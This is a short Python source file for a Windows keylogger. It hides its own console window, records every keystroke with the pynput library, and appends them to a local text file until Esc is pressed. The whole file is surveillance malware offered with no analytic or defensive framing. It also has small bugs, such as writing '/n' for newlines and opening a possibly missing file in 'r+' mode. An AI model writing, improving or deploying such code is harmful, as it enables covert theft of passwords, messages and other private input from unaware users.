import win32api
import win32console
import win32gui
from pynput import keyboard

#hide console
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

path_to_logFile = 'C:\output.txt'

#event handle
def on_press(key):
    try:
        # check charater, number and ASCII
        if hasattr(key, 'char') and key.char is not None:
            key_char = key.char
        else:
            # enter, space ...
            key_char = '/n' if key == keyboard.Key.enter else ' '

        # read file
        with open(path_to_logFile, 'r+') as f:
            buffer = f.read()
        # write file
        with open(path_to_logFile, 'r+') as f:
            buffer += key_char
            f.write(buffer)
    except Exception as e:
        with open(path_to_logFile, 'a') as error_file:
            error_file.write(f"Error: {e}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # stop == ESC
        return False
    
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()